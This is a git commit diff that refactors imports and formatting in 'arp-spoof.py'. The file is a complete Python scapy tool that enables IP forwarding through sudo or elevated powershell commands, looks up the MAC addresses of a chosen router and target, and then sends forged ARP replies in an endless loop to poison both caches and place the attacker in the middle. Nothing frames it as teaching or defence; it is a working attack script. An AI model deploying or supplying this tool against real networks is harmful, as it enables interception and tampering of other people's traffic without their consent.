0fe0e45bbf430835a4e803c0bf9bbd90d35695d0
Whiplash <devesh.shrestha21@gmail.com>
2025-12-10 14:31:10 +0545

    Update arp-spoof.py

--- arp-spoof.py
+++ arp-spoof.py
@@ -1,27 +1,32 @@
-import sys
 import os
-import time
 import platform
-import scapy.all as scapy
+import sys
+import time
+from scapy.layers.l2 import Ether, ARP
+from scapy.sendrecv import srp, send
 
 def ipforward(constant):
-    change = 'Enabled' if constant else 'Disabled'
+    change = "Enabled" if constant else "Disabled"
     try:
         if platform.system() == "Darwin":
-            os.system(f"sudo sysctl -w net.inet.ip.forwarding={constant} > /dev/null 2>&1")
+            os.system(
+                f"sudo sysctl -w net.inet.ip.forwarding={constant} > /dev/null 2>&1"
+            )
         elif platform.system() == "Linux":
             os.system(f"sudo echo {constant} > /proc/sys/net/ipv4/ip_forward")
         elif platform.system() == "Windows":
-            os.system(f"powershell -Command \"Start-Process powershell -Verb RunAs -ArgumentList 'Set-NetIPInterface -Forwarding {change}'\" > NUL 2>&1")
+            os.system(
+                f"powershell -Command \"Start-Process powershell -Verb RunAs -ArgumentList 'Set-NetIPInterface -Forwarding {change}'\" > NUL 2>&1")
     except Exception as error:
         print(f"\n[!] error: {error}\n")
         sys.exit()
 
 def macadr(ipadr):
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp = scapy.ARP(pdst=ipadr)
-    packet = broadcast/arp
-    result = scapy.srp(packet, timeout=2.0, verbose=False)[0]
+    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp = ARP(pdst=ipadr)
+    packet = broadcast / arp
+    result = srp(packet, timeout=2.0
+, verbose=False)[0]
     if result:
         return result[0][1].hwsrc
     else:
@@ -29,22 +34,22 @@ def macadr(ipadr):
         ipforward(0)
         sys.exit()
 
-def spoof(router, target, adrRouter, adrTarget): 
-    routerPacket = scapy.ARP(op=2, hwdst=adrRouter, pdst=router, psrc=target)
-    scapy.send(routerPacket)
-    targetPacket = scapy.ARP(op=2, hwdst=adrTarget, pdst=target, psrc=router)
-    scapy.send(targetPacket)
+def spoof(router, target, adrRouter, adrTarget):
+    routerPacket = ARP(op=2, hwdst=adrRouter, pdst=router, psrc=target)
+    send(routerPacket)
+    targetPacket = ARP(op=2, hwdst=adrTarget, pdst=target, psrc=router)
+    send(targetPacket)
 
 try:
     ipforward(1)
-    router = input(f"\n[?] router: ")
-    target = input(f"[?] target: ")
+    router = input("\n[?] router: ")
+    target = input("[?] target: ")
     adrRouter = str(macadr(router))
     adrTarget = str(macadr(target))
     while True:
         spoof(router, target, adrRouter, adrTarget)
         time.sleep(2.0)
 except KeyboardInterrupt:
-    print(f"\n[0]")
+    print("\n[0]")
     ipforward(0)
     sys.exit()
